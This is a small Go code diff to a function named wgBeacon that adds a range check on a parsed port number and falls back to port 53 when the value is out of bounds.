@@ -239,6 +239,8 @@ func wgBeacon(uri *url.URL) *Beacon {
 	lport, err := strconv.Atoi(uri.Port())
 	if err != nil {
 		lport = 53
+	} else if lport < 0 || lport > int(math.MaxUint16) {
+		lport = 53
 	}
 
 	var conn net.Conn
